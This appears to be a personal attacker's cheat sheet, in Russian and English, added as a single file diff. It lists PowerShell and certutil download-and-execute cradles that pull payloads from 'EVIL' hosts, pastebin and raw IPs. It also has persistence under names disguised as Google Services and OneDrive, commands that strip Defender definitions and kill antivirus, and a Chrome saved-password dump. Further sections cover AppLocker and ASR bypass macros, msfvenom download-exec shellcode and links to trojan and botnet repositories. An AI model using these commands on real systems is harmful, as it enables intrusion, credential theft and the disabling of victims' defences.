@@ -1,0 +1,768 @@
+
+
+
+
+  
+figlet 
+                                         _
+ _ __ ___   __ _ _ __  _ __  _   _  __ _| |
+| '_ ` _ \ / _` | '_ \| '_ \| | | |/ _` | |
+| | | | | | (_| | | | | | | | |_| | (_| | |
+|_| |_| |_|\__,_|_| |_|_| |_|\__,_|\__,_|_|
+
+
+cd /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap -sS -sV --script=vulscan/vulscan.nse target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
+nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
+nmap -sV --script=vuln target
+nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
+
+
+
+
+ _ __  _ __ _____  ___   _
+| '_ \| '__/ _ \ \/ | | | |
+| |_) | | | (_) >  <| |_| |
+| .__/|_|  \___/_/\_\\__, |
+|_|                  |___/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://github.com/AgigoNoTana/HiddenDesktopViewer
+
+
+apt-get install davfs2
+установка web-dove
+
+1180145441
+
+135246357Qwerty
+
+54r8sp
+
+
+https://evi1cg.me/archives/remote_exec.html
+
+
+
+
+
+########################################################################################################################################################################
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+Команда:
+
+
+powershell -w Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('ссылка на файл выше');
+
+
+DOWNLOAD comands
+
+
+Исполнение*****  powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).downloadString('http://192/ps.txt')"
+
+
+# normal download cradle
+IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
+
+# PowerShell 3.0+
+IEX (iwr 'http://EVIL/evil.ps1')
+
+# hidden IE com object
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+
+# Msxml2.XMLHTTP COM object
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# WinHttp COM object (not proxy aware!)
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# using bitstransfer- touches disk!
+Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r
+
+# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
+#   code to execute needs to be a base64 encoded string stored in a TXT record
+IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
+
+# Using System's Proxy and User-Agent string:
+$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$Wc.DownLoADSTriNG('http://EVIL/evil.ps1') | IEX
+
+# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
+<#
+<?xml version="1.0"?>
+<command>
+   <a>
+      <execute>Get-Process</execute>
+   </a>
+  </command>
+#>
+$a = New-Object System.Xml.XmlDocument
+$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
+$a.command.a.execute | iex
+
+CMD> powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object Net.Webclient).downloadstring(\"http://host/evil.ps1\")"
+
+
+
+
+Файл:
+
+IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console'); console -Silently -uriConsole IP твой:8080
+
+
+          < Invoce-sdcld  >   этот модуль юзать
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+   reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Google Services" /t REG_SZ /F /D "C:\Users\Admin\appdata\local\temp\dwm.exe"
+
+
+         Google service название задачи в реестре
+
+
+
+
+schtasks /create /tn OneDrive /sc ONLOGON /rl highest /ru system /F /tr "C:\Users\Admin\Appdata\local\temp\dwm.exe"
+
+
+OneDrive имя задачи
+
+
+iwr("апач сслыка/gomet.exe") -OutFile gomet.exe  #### загрузить файл в директорию где ты находишься
+
+
+на 7 не работает
+
+
+Get-ItemProperty -Path "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  ######### --- ,<<< посмотреть запись в реестре
+
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List   #av info cmd
+
+
+узнать антивир в системе
+
+
+wmic startup list full ---- список автозагрузки
+Get-WindowsOptionalFeature -Online | findstr Net <<< проверка .Net установленных в системе
+
+
+powershell IEX (New-Object System.Net.WebClient).DownloadFile('http://lol.com/link.exe',"$env:temp\link.exe");[System.Diagnostics.Process]::Start("$env:temp\link.exe")
+
+
+
+at \\[remote host name or IP address] 12:00 cmd /c "C:\windows\temp\mal.exe"
+
+
+Download  / execute команда
+
+"""""""""  https://evi1cg.me/archives/remote_exec.html  """"""""""
+
+
+
+
+cmd /c certutil -urlcache -split -f http://12.12.21.212/putty.exe %APPDATA%\putty.exe & start %APPDATA%\putty.exe
+
+cmd|' /c bitsadmin /transfer d90f https://the.earth.li...t/w32/putty.exe %APPDATA%\putty.exe&%APPDATA%\putty.exe&del %APPDATA%\putty.exe'!A0
+
+cmd|' /c bitsadmin /create 1 bitsadmin /addfile 1 http://12.12.12.2/autoruns.exe c:\folder\\autoruns.exe
+
+
+cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe
+
+
+########################################################################################################################################################################
+
+
+ ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____
+|  _ \| ____|  _ \/ ___|_ _/ ___|_   _| ____| \ | |/ ___| ____|
+| |_) |  _| | |_) \___ \| |\___ \ | | |  _| |  \| | |   |  _|
+|  __/| |___|  _ < ___) | | ___) || | | |___| |\  | |___| |___
+|_|   |_____|_| \_|____|___|____/ |_| |_____|_| \_|\____|_____|
+
+
+
+https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/
+
+mshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”powershell.exe -noexit -command [Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(\’h\’+\’t\’+\’t\’+\’p\’+\’s:\’+\’//p\’+\’a\’+\’s\’+\’t\’+\’e\’+\’b\’+\’i\’+\’n\’+\’.\’+\’c\’+\’o\’+\’m\’+\’/\’+\’r\’+\’a\’+\’w\’+\’/\’+\’2LDaeHE1\’))).EntryPoint.Invoke($N,$N)””,0,true)(window.close)
+
+
+
+schtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr “”mshta vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe https://pastebin[.]com/raw/tb5gHu2G””,0,true)(window.close)”” /F ‘
+
+
+
+CreateObject(“Wscript.Shell”).regwrite “HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate”, “C:\Windows\System32\mshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe%20http://pastebin.com/raw/YYZq1XR0″”,0,true)(window.close)” , “REG_EXPAND_SZ”
+
+
+
+//kill av
+
+cmd.exe /c cd “”%ProgramFiles%\Windows Defender”” & MpCmdRun.exe -removedefinitions -dynamicsignatures & taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & forfiles /c “”taskkill /f /im MSASCuiL.exe”” & forfiles /c “”taskkill /f /im MpCmdRun.exe”” & exit
+
+
+
+
+
+
+
+
+
+ __________            .__.     _________  ________
+   \_______  \____  _____|  |__   \_   ___ \ \_____  \
+    |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/
+    |    |  ( <_>)___ \|   Y  \ \     \____/       \
+    |____|   \____/____  >___|  /  \______  /\_______ \
+                       \/     \/          \/         \/
+    ================= www.PoshC2.co.uk ================
+
+EDIT the config file: '/opt/PoshC2_Python/Config.py'
+
+sudo python /opt/PoshC2_Python/C2Server.py
+sudo python /opt/PoshC2_Python/ImplantHandler.py
+
+To install via systemctl read poshc2.service
+
+
+
+
+    _    ____ _____
+   / \  |  _ |_   _|
+  / _ \ | |_) || |
+ / ___ \|  __/ | |
+/_/   \_|_|    |_|
+
+
+
+
+
+ДАМП паролей гугл хром 
+
+    shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat
+
+ПРОКСИ
+
+Command to enable proxy usage:///////////////////////////////////////////////////////////////////////////////////////////
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+  
+  Command to disable proxy usage:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
+  
+  Command to change the proxy address:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f
+  
+  Also, in this case, it is a per-user setting than a system-wide setting.
+
+
+
+
+  Удалить определения и отключить AV-защиту (полезно, когда скрипты Powershell блокируются Defender)
+
+  c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+
+
+
+
+( 1 ) Use Pcalua
+
+p^c^a^l^u^a^ ^-^n^ ^-^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^
+( 2 ) Alternate Data Streams ADS:>
+
+cmd.exe:> type C:\Users\Gihad\Desktop\file.bat > C:\Users\Gihad\Desktop\test.txt:x22x2
+cmd.exe:> netsh exec C:\Users\Gihad\Desktop\test.txt:x22x2
+( 3 ) pnputil.exe Launcher .INF:> Note This Eveything here .INF Work on My Script INFscript Only !
+
+pnputil.exe /add-driver C:\FilesINFExecution.inf /install
+
+&- My Code INFScript Injection Command Line
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
+( 4 ) INFDefaultInstall Launch Execute INFScript
+
+INFDefaultInstall.exe C:\INFPS.inf
+&-  Code INFScript
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
+( 5 ) setupapi.dll Launch Execute My INFScript
+
+setupapi.dll,InstallHinfSection DefaultInstall 132 C:\INFPS.inf
+&-  Code INFScript
+https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
+( 6 ) DLL Execution Using ( Reflection ) In CPLEx AccessibilityCPL RegServer
+
+&- Add Values in HKLM Name File ms-settings in Open/Shell/Command
+&- rundll32 accessibilitycpl.dll,DllRegisterServer
+&- rundll32 shell32.dll,Control_RunDLL "C:\Windows\tem32\desk.cpl"
+( 7 ) Language LUA in Files .wlua
+
+wlua.exe C:\testing.wlua
+&- Hello World Exe My Code LUA
+https://gist.githubusercontent.com/homjxi0e/bbd218dea9bf63fd36524b9777a399f3/raw/888f7e484651fdb733d6261ca002d684a6e5bf9b/Test.wlua
+( 8 ) SCT ScriptLet Execution in My INFScript
+
+rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 C:\INFPS.inf
+&- Raw Code
+https://gist.github.com/homjxi0e/87b29da0d4f504cb675bb1140a931415
+( 9 ) Jscript Execute Code Via ( Eval,VSA,)
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
+$attack = 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'
+[Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+&- Code Execute
+https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw/4c8709382280de158b99dd78f91875e32a54bac4/ATPSJScript
+( 10 ) MSI Launch Execution ( MsiExec.exe )
+
+ msiexec.exe /passive /i C:\testing.msi /norestart
+ &- File MSI Hello World Exe in .MSI
+( 10v1 ) COM Component object Model Hijacking
+
+&- Add Reg in System
+https://gist.githubusercontent.com/homjxi0e/8e42aa716361dc41b1c45a314bea501c/raw/327104671eebad1361210524f34076503e6b8e44/COM-hijacking.reg
+&- You can now Execution invoke-CLSID Via xwizard.exe
+xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+( 10v2 ) Execute VBScript Via mshta.exe
+
+&- Execute VBScript Code using mshta.exe
+mshta.exe VBScript:Close(Execute("Set S=CreateObject(""WScript.Shell""):If S.AppActivate(""maybe-Run"")=False Then:S.Run(""C:\Windows\system32\Calc.exe""):End If"))
+https://gist.githubusercontent.com/homjxi0e/eb16d75f3db6d6081648f2c5c5c98c3b/raw/0870f7553095dcf6519f93c1cf72c6415468140b/VBSExC
+( 10v3 ) forfiles.exe Execution Endless
+
+forfiles.exe /c calc.exe
+
+( 10v4 ) Powershell Scriptlet COM Object Hijacking via System.Activator
+
+$COMobj = [activator]::CreateInstance([type]::GetTypeFromCLSID("{00020000-0000-0000-C000-000000000046}"));$COMobj.Exec();
+https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c
+( 10v5 ) ScriptRunner.exe Execution
+
+ScriptRunner.exe -appvscript C:\Windows\System32\calc.exe
+( 10v6 ) msdt.exe Execute EXE-MSI Via Reader XML wtih Launch by Pcwrun.exe
+
+ msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
+ &- link file PCW8E57.xml
+ https://gist.github.com/homjxi0e/3f35212db81b9375b7906031a40c6d87
+( 10v7 ) Launch MSI Pacakge Execution Powershell
+
+install-Package C:\test.msi
+https://github.com/homjxi0e/MSIScript/blob/master/Exec-Execute.msi
+( 10v8 ) DLL Execute CML Launch Application
+
+rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication calc.exe
+( 10v9 ) HTA/MSI Execute Using OpenWith.exe
+
+Whitelisting SRP Bypassing Using OpenWith.exe To Launch HTA/MSI Execution
+&- OpenWith.exe /c C:\test.hta
+&- OpenWith.exe /c C:\testing.msi
+( 10v11 ) XrML Digital License (.xrm-ms) ActiveX
+
+iexplorer C:\test.xrm-ms
+https://gist.github.com/homjxi0e/099d8f35f3b2e1b7daa7cbe366df1ed3
+
+( 10v12 )
+
+start C:\obj.url
+https://gist.github.com/homjxi0e/0023a9cb5d4fee198019f87bd348effc
+( 10 v13 ) ActiveX executing using a SVG Document
+
+iexplorer C:\PoC.svg
+https://gist.github.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0
+
+(10v14) Dxcap.exe Abuse
+
+Dxcap.exe -c C:\Windows\System32\notepad.exe
+
+(Note) Product Via @bohops ( 11 ) HTA Launch Execution ( url.dll )
+
+Rundll32.exe url.dll,OpenURL FileHTA Or Anything
+( 12 ) SCT Launch Execution InSide INFScript ( ieadvpack.dll )
+
+rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
+( 13 ) XML Launch Execution Via Reflection,Assembly Powershell
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
+$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/caseysmithrc/8e58d11bc99e496a19424fbe5a99175f/raw/38256d70b414f6678005366efc86009c562948c6/xslt2.proj")
+$e=new-object Microsoft.Build.Evaluation.Project($proj);
+$e.build();
+( 14 ) CSharp Launch Execution Via Reflection.Assembly Powershell
+
+[Reflection.Assembly]::LoadWithPartialName('http://Microsoft.Build '); $e=new-object http://Microsoft.Build.Evaluation.Project('evil.csproj'); $e.Build();
+( 15 ) SCT Execution Via INFScript By ( advpack.dll )
+
+rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
+( 16 ) XML Launch Execution Via Reader XML,Transform Object Powershell
+
+$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;
+( 17 ) SCT Launch Execution Reflection.Assembly Via ( Microsoft.VisualBasic )
+
+ [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct …').Exec(0)
+
+( 18 ) SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct …").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+( 19 ) Commandline APT Launch Execution Applocker/Bypassing Via ( CL_LoadAssembly )
+
+import-module C:\windows\diagnostics\system\AERO\CL_LoadAssembly.ps1
+LoadAssemblyFromPath C:\Windows\System32\calc.exe
+( 20 ) HTA Launch Execution Via ( shdocvw.dll )
+
+rundll32.exe shdocvw.dll, OpenURL <path to local URL file>
+( 21 ) HTA Launch Execution Via ( ieframe.dll )
+
+rundll32.exe ieframe.dll, OpenURL <path to local URL file>
+( 22 ) Commandline Execute Via Vshadow.exe
+
+ Vshadow exec calc.exe
+( 23 ) CSharp Execution Via ProjectInstance RA Powershell
+
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build')
+$p="c:\test\test.csproj"
+$e=new-object Microsoft.Build.Execution.ProjectInstance($p)
+$e.build()
+
+
+переключаем прокси на компе
+Command to enable proxy usage:///////////////////////////////////////////////////////////////////////////////////////////
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+  
+  Command to disable proxy usage:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
+  
+  Command to change the proxy address:
+
+  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f
+  
+  Also, in this case, it is a per-user setting than a system-wide setting.
+
+
+
+
+
+  ДАМП паролей гугл хром 
+
+    shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat
+
+
+
+Python SSL веб-сервер
+Создать файл PEM
+
+    openssl req -newkey rsa:2048 -x509 -keyout cakey.pem -out cacert.pem -days 3650
+Чтобы объединить закрытый ключ и открытый сертификат в pem-файл (который требуется для многих веб-серверов):
+
+    cat cakey.pem cacert.pem > server.pem
+Код Python
+
+    import BaseHTTPServer, SimpleHTTPServer
+    import ssl
+
+    httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
+    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
+    httpd.serve_forever()
+
+ ____  ____  _____
+|  _ \|  _ \| ____|
+| | | | | | |  _|
+| |_| | |_| | |___
+|____/|____/|_____|
+
+
+
+
+https://gist.github.com/mgeeky/981213b4c73093706fc2446deaa5f0c5
+
+https://medium.com/red-team/dde-payloads-16629f4a2fcd
+
+https://blackboxhcker.blogspot.com/
+
+
+ ____  _     ___   ____
+| __ )| |   / _ \ / ___|___
+|  _ \| |  | | | | |  _/ __|
+| |_) | |__| |_| | |_| \__ \
+|____/|_____\___/ \____|___/
+
+
+
+  https://blackboxhcker.blogspot.com/
+
+MIMIKATZ
+
+https://blog.xpnsec.com/exploring-mimikatz-part-1/
+
+
+
+CAR HACKING
+
+https://github.com/wtsxDev/Vehicle-Security/blob/master/README.md
+
+
+трояны ботнеты здесь https://github.com/Tlgyt?tab=repositories
+
+
+ресурсы +++  https://github.com/wtsxDev
+
+пентест академия www.pentesteracademy.com
+
+____________________________________________________________________________
+                   как и что делать                                         |
+                                                                            |
+https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/README.md    |
+____________________________________________________________________________|
+
+
+
+https://github.com/threatexpress/pasties/blob/master/pasties.md
+
+
+https://github.com/tom0li/tom0li.github.io/blob/master/_posts/2018-5-28-%E5%86%85%E7%BD%91%E5%A4%87%E5%BF%98%E5%BD%95.md     приемы)
+
+
+добавить 3389 http://www.91ri.org/5866.html   +       https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/
+
+
+
+
+HVNC
+
+https://www.youtube.com/watch?v=XEn5-d4c5xg
+
+https://github.com/veyon/ultravnc
+
+https://github.com/zealotous/ultravnc   доработаная
+
+
+
+
+
+
+
+
+
+msfvenom -p windows/download_exec URL=http://192.168.100.9/1.exe -f c -o test.raw     генерация шелкода
+
+msfvenom -p windows/download_exec URL=http://192.168.100.9/1.exe -f exe -a x86 -t 30 -o tee.exe   генерация в ЕХЕ файл
+
+https://doxsec.wordpress.com/2015/07/31/how-to-generate-shellcode-from-custom-exe-in-metasploit/
+
+про шеллкоды  >>>> https://www.youtube.com/watch?v=PJUjUt_4PiQ
+
+
+////////////////                   msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python    ///////////////////////////////////
+
+https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec/
+
+ VBS - down-exec
+Set args = Wscript.Arguments
+Url = "http://domain/file"
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+.type = 1 '
+.open
+.write xHttp.responseBody
+.savetofile " C:\%homepath%\file", 2 '
+end with
+
+
+
+certutil.exe -urlcache -split -f http://site.com/file
+
+
+
+Включить удаленный рабочий стол:
+
+  reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+  >
+
+  <!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+  <!-- DFIR -->
+  <!--    .sct files are downloaded and executed from a path like this -->
+  <!-- Though, the name and extension are arbitary.. -->
+  <!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
+  <!-- Based on current research, no registry keys are written, since call "uninstall" -->
+
+
+  <!-- Proof Of Concept - Casey Smith @subTee --> 
+        <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
+  <script language="JScript">
+    <![CDATA[
+
+      var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+
+    ]]>
+  </script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+  function Exec()
+  {
+    var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+  }
+
+]]>
+</script>
+
+</scriptlet>
+
+
+
+
+' ASR rules bypass creating child processes
+' https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/enable-attack-surface-reduction
+' https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office
+' https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule
+
+Sub ASR_blocked()
+    Dim WSHShell As Object
+    Set WSHShell = CreateObject("Wscript.Shell")
+    WSHShell.Run "cmd.exe"
+End Sub
+
+Sub ASR_blocked2()
+    Dim WSHShell As Object
+    Set WSHShell = CreateObject("Shell.Application")
+    WSHShell.ShellExecute "cmd.exe"
+End Sub
+
+Sub ASR_blocked3()
+    Call Shell("cmd.exe", 1)
+End Sub
+
+Sub ASR_blocked4()
+    Set WshShell = CreateObject("WScript.Shell")
+    Set WshShellExec = WshShell.Exec("cmd.exe")
+End Sub
+
+Sub ASR_blocked5()
+    Set obj = CreateObject("Excel.Application")
+    obj.DisplayAlerts = False
+    obj.DDEInitiate "cmd", "/c notepad.exe"
+End Sub
+                
+Sub ASR_bypass_create_child_process_rule()
+    Const ShellBrowserWindow = _
+    "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
+    Set SBW = GetObject("new:" & ShellBrowserWindow)
+    SBW.Document.Application.ShellExecute "cmd.exe", Null, "C:\Windows\System32", Null, 0
+End Sub
+
+Sub ASR_bypass_create_child_process_rule2()
+    Const ExecuteShellCommand = _
+    "{49B2791A-B1AE-4C90-9B8E-E860BA07F889}"
+    Set MMC20 = GetObject("new:" & ExecuteShellCommand)
+    MMC20.Document.ActiveView.ExecuteShellCommand ("cmd.exe")
+End Sub
+
+Sub ASR_bypass_create_child_process_rule3()
+    Const OUTLOOK = _
+    "{0006F03A-0000-0000-C000-000000000046}"
+    Set objShell = GetObject("new:" & OUTLOOK)
+    objShell.CreateObject("WScript.Shell").Run "cmd.exe", 0
+End Sub
+
+Sub ASR_bypass_create_child_process_rule4()
+    Const ShellWindows = _
+    "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
+    Set SW = GetObject("new:" & ShellWindows).Item()
+    SW.Document.Application.ShellExecute "cmd.exe", Null, "C:\Windows\System32", Null, 0
+End Sub
+                            
+Sub ASR_bypass_create_child_process_rule5()
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
+    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
+    objProcess.Create "cmd.exe", Null, objConfig, intProcessID
+End Sub
+
+
+
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
+  xmlns:msxsl="urn:schemas-microsoft-com:xslt"  
+  xmlns:u="urn:my-scripts">  
+    <!--  
+  '<a/>' > blah.txt
+  $xslt = New-Object System.Xml.Xsl.XslTransform
+  $xslt.Load("$pwd\JankyAF.xsl");
+  $xslt.Transform("$pwd\blah.txt","$pwd\blah.txt")
+  -->
+  <msxsl:script language="C#" implements-prefix="u">  
+    <![CDATA[  
+  public void BoomTown(){ System.Diagnostics.Process.Start("calc"); }  
+  ]]>  
+  </msxsl:script>  
+  <xsl:template match="/">  
+  <xsl:value-of select="u:BoomTown()"/>               
+  </xsl:template>  
+</xsl:stylesheet>
+
+
+
+
+Meterpreter portfwd
+
+
+# https://www.offensive-security.com/metasploit-unleashed/portfwd/
+# forward remote port to local address
+meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
+kali > rdesktop 127.0.0.1:3389
+
+8.  bat, vbs, ps1
+    1. cmd.exe /k < script.txt
+    2. cscript.exe //E:vbscript script.txt
+    3. Get-Content script.txt | iex
+
+
+
+
+
+
